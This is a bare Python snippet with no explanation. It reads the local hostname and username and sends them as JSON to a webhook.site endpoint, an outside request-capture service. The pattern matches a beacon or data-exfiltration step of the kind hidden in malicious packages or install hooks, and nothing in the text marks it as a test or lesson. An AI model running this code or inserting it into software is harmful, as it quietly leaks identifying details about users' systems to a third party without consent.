import socket, getpass, json, urllib.request
d = {"host": socket.gethostname(), "user": getpass.getuser()}
r = urllib.request.Request("https://webhook.site/example", data=json.dumps(d).encode())
urllib.request.urlopen(r)
